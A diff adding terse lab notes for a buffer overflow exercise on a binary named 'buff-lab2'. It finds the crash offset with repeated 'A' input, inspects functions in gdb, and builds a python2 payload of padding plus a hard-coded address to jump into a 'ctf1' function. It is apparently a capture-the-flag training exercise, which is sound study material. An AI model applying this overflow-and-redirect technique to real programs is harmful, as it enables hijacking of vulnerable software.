@@ -1,0 +1,23 @@
+sudo apt install zip
+ sudo unzip buff-lab2.zip
+sudo apt install gdb
+sudo -s
+sudo ./buff-lab2    --> check the input validation by typing 'A' to get the segmentation error
+          ex: Enter your password: AAAAAAAAAAAAAAAAAAAAAAAAAAAA    --> at 28 
+
+gdb ./buff-lab2
+info functions
+disassemble main
+disassemble ctf1
+
+python2.7 -c 'print "A"*28' > buff.txt
+gdb ./buff-lab2
+(gdb) run < buff.txt
+
+info functions ctf1   --> u will get the address 
+
+python2.7 -c 'print "A"*30 + "\x68\x92\x04\x08"' > buff.txt 
+
+
+==============================================================================
+
